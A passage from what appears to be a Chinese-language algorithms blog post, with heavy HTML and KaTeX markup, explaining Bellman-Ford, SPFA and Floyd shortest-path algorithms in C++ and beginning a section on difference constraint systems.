class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;    <span class="comment">//执行n-1轮操作，</span></span><br><span class="line"><span class="keyword">for</span>(each edge u-&gt;v)&#123;   <span class="comment">//每轮操作都遍历所有边</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + length[u-&gt;v] &lt; d[v])&#123;  <span class="comment">//以u为中介点可以使d[v]更小</span></span><br><span class="line">d[v] = d[u] + length[u-&gt;v];  <span class="comment">//松弛操作</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，如果图中没有从源点可以到达的负环，那么数组 d 中的所有值已经到达最优。因此，只需要对所有的边进行一轮操作，判读是否某条边 u-&gt;v 仍然满足 d [u] + length [u-&gt;v] &lt; d [v]，如果有，则说明图中有从源点可达的负环，返回 false，否则，说明数组 d 中所有值都达到最优，返回 true。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(each edge u-&gt;v)&#123;   <span class="comment">//对每条边进行判断</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + length[u-&gt;v] &lt; d[v])&#123;   <span class="comment">//如果仍可以被松弛</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//说明图中有从源点可达的负环</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//数组d的所有值已经达到最优</span></span><br></pre></td></tr></table></figure><p>这里给出临界表的方法，由于 Bellman-Ford 需要遍历所有的边，故邻接矩阵使用时可能会导致复杂度上升的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line"><span class="type">int</span> v,dis;  <span class="comment">//v是邻接表的目标顶点，dis为邻接边的边权</span></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;Node&gt; Adj[MAX_V];   <span class="comment">//G的邻接表</span></span><br><span class="line"><span class="type">int</span> n;   <span class="comment">//n为定点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V];   <span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Bellman</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d, d+ MAX_V, INF);</span><br><span class="line">d[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i&lt;n<span class="number">-1</span> ; i++)&#123;   <span class="comment">//进行n - 1 轮操作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt; n ;u++)&#123;    <span class="comment">//每轮操作都遍历所有边</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v =Adj[u][j].v;  <span class="comment">//邻接边的顶点</span></span><br><span class="line"><span class="type">int</span> dis = Adj[u][j].dis;  <span class="comment">// 邻接边的边权</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;  <span class="comment">//以u为中介点可以使d[v]更小</span></span><br><span class="line">d[v] = d[u] + dis; <span class="comment">//松弛操作</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面是判断负环的代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span> ;u &lt; n; u++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v = Adj[u][j].v;</span><br><span class="line"><span class="type">int</span> dis = Adj[u][j].dis;</span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 Bellman-Ford 算法的思路很简洁，但是由于其 O (VE) 的时间复杂度确实较高，在很多情况下并不尽人意。其实，BF 算法的每轮操作都需要操作所有边的话，显然其中会有重复的无意义操作，严重影响了算法的性能。<strong>只有当某个 1 顶点 u、的 d [u] 的值改变时，从它出发的边的邻接点 v 的 d [v] 值才有可能被改变。</strong> 由此可以进行一个<strong>优化：</strong> 建立一个队列，每次将队列队首顶点 u 去除，然后对从 u 出发的所有边 u-&gt;v 进行松弛操作，也就是判断 d [u] + length [u-&gt;v] &lt; d [v] 是否成立，如果成立，则用 d [u] + length [u-&gt;v] 覆盖 d [v]，于是 d [v] 获得更优的值，如果 v 不再队列中，就把 b 加入队列。这样操作直到队列为空（说明图中没有从源点可达的负环），或者是某个顶点入队次数超过 V-1。下面是伪代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line">源点s入队;</span><br><span class="line"><span class="keyword">while</span>(队列非空)&#123;</span><br><span class="line">取出队首元素u;</span><br><span class="line"><span class="keyword">for</span>(u的所有邻接边u-&gt;v)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + dis;</span><br><span class="line"><span class="keyword">if</span>(v当前不在队列)&#123;</span><br><span class="line">v入队;</span><br><span class="line"><span class="keyword">if</span>(v入队次数大于n<span class="number">-1</span>)&#123;</span><br><span class="line">说明有可达负环,<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种优化后的算法被称为<strong> SPFA</strong>，它的期望时间复杂度是 O (KE)，E 是图的变数，K 是常数，在很多情况下 k 不超过 2. 但是如果图中有从源点可达的负环，则时间复杂度会退化程 O (VE。理解<strong> SPFA 的关键是它如何从 Bellman-Ford 算法优化而来的</strong>。下面给出邻接表图的 SPFA 代码。注意：<strong>使用 SPFA 可以判断是否存在从源点可达的负环，如果负环从源点不可达，需要添加一个辅助顶点 C，并添加一条从源点到达 C 的有向边以及 V-1 条从 C 到达除源点外各顶点的有向边才能判断负环是否存在。因为：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;Node&gt; Adj[MAX_V];  <span class="comment">//图G的邻接表</span></span><br><span class="line"><span class="type">int</span> n,d[MAXV],num[MAXV];  <span class="comment">//num表示顶点入队次数</span></span><br><span class="line"><span class="type">bool</span> inq[MAXV];  <span class="comment">//顶点是否在队列中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SPFA</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化部分</span></span><br><span class="line"><span class="built_in">memset</span>(inq,<span class="literal">false</span>,<span class="built_in">sizeof</span>(inq));</span><br><span class="line"><span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="built_in">sizeof</span>(num));</span><br><span class="line"><span class="built_in">fill</span>(d,d+MAXV,INF);</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line">Q.<span class="built_in">push</span>(s);  <span class="comment">//源点入队</span></span><br><span class="line">inq[s] = <span class="literal">true</span>; <span class="comment">//源点已经入队</span></span><br><span class="line">num[s]++;  <span class="comment">//源点入队次数加1</span></span><br><span class="line">d[s]=<span class="number">0</span>;   <span class="comment">//源点的d值为0</span></span><br><span class="line"><span class="comment">//主体部分</span></span><br><span class="line"><span class="keyword">while</span>(!Q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> u = Q.<span class="built_in">front</span>(); <span class="comment">//队首顶点编号为u</span></span><br><span class="line">Q.<span class="built_in">pop</span>();  <span class="comment">//出队</span></span><br><span class="line">inq[u] = <span class="literal">false</span>;  <span class="comment">//设置u为不在队列中</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j&lt;Adj[u].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line"><span class="type">int</span> v = Adj[u][j].v;</span><br><span class="line"><span class="type">int</span> dis = Adj[u][j].dis;</span><br><span class="line"><span class="comment">//松弛操作</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + dis;</span><br><span class="line"><span class="keyword">if</span>(!inq[v])&#123;  <span class="comment">//如果v不再队列中</span></span><br><span class="line">Q.<span class="built_in">push</span>(v);</span><br><span class="line">inq[v] = <span class="literal">true</span>;</span><br><span class="line">num[v]++;</span><br><span class="line"><span class="keyword">if</span>(num[v] &gt;= n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="floyd算法"><a class="markdownIt-Anchor" href="#floyd算法">#</a> Floyd 算法</h4><p>弗洛伊德算法可以用来解决<strong>全源最短路径问题</strong>，即对给定的图 G (V,E)，求任意两点 u，v 之间的最短路径长度，时间复杂度为 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>)。由于其复杂度限制了定点数 n 在 200 以内，因此使用邻接矩阵来实现 Floyd 算法是非常合适和方便的。<br>Floyd 算法基于这样一事实：如果存在顶点 k，使得以 k 作为中介点时顶点 i 和顶点 j 的当前最短距离缩短，则使用顶点 k 作为顶点 i 和顶点 j 的中介点，即当 dis [i][k] + dis [k][j] &lt; dis [i][j] 时，令 dis [i][j] = dis [i][k] + dis [k][j]。<br>基于上面的事实，Floyd 算法的流程非常简单，代码也很简洁：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_V = <span class="number">200</span>;  <span class="comment">//MAX_V为最大顶点数</span></span><br><span class="line"><span class="type">int</span> n,m;   <span class="comment">//n为顶点数，m为边数</span></span><br><span class="line"><span class="type">int</span> dis[MAX_V][MAX_V];  <span class="comment">//dis[i][j]表示顶点i和顶点j的最短距离</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Floyd</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(dis[i][k] != INF &amp;&amp; dis[k][j] != INF &amp;&amp; dis[i][k] + dis[k][j] &lt; dis[i][j])&#123;</span><br><span class="line">dis[i][j] = dis[i][k] + dis[k][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int main()&#123;</span></span><br><span class="line"><span class="comment"> int u, v, w;</span></span><br><span class="line"><span class="comment"> fill(dis[0], dis[0] + MAX_V * MAX_V, INF);</span></span><br><span class="line"><span class="comment"> scanf()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="图论转化"><a class="markdownIt-Anchor" href="#图论转化">#</a> 图论转化</h2><p>这里介绍一些奇特的算法，即将一些常规问题转化为图论问题。</p><h3 id="差分约束"><a class="markdownIt-Anchor" href="#差分约束">#</a> 差分约束</h3><p><strong>差分约束系统</strong>是下面这种形式的多元一次不等式组。<br>![[Pasted image 20231219231448.png]]<br>（每个不等式称为一个<strong>约束条件</strong>，都是两个未知量之差小于或等于某个常数）<br>在算法竞赛中，很多题目会给出（或隐性地给出）一系列的<strong>不等关系</strong>，我们可以尝试把它们转化为差分约束系统来解决。<br>我们设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo>&lt;</mo><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1 - x_2  &lt;= c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span> ，移项可得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>&lt;</mo><mo>=</mo><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1 &lt;= x_2 + c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span><br> 观察这个不等式与<strong>最短路问题</strong>中的三角形不等式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo>&lt;</mo><mo>=</mo><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo>+</mo><msub><mi>w</mi><mrow><mi>v</mi><mo separator="true">,</mo><mi>u</mi></mrow></msub></mrow><annotation encoding="application/x-tex">dist[u] &lt;= dist[u] + w_{v,u}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">u</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 的相似之处。利用这一点，我们可以把它转化为一个<strong>图论</strong>问题。也就是说，对于每一个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><msub><mi>c</mi><mi>i</mi></msub></msub><mo>−</mo><msub><mi>x</mi><msubsup><mi>c</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></msub><mo>&lt;</mo><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_{c_i} - x_{c_i&#x27;} &lt;= y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83343em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9390400000000001em;vertical-align:-0.3999400000000001em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5256600000000002em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7416285714285715em;"><span style="top:-2.177714285714286em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3222857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3999400000000001em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , 我们都从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><msubsup><mi>c</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></msub></mrow><annotation encoding="application/x-tex">x_{c_i&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8305em;vertical-align:-0.3999400000000001em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5256600000000002em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7416285714285715em;"><span style="top:-2.177714285714286em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3222857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3999400000000001em;"><span></span></span></span></span></span></span></span></span></span> 到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><msub><mi>c</mi><mi>i</mi></msub></msub></mrow><annotation encoding="application/x-tex">x_{c_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68066em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span></span></span></span> 建立一条边，权为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" 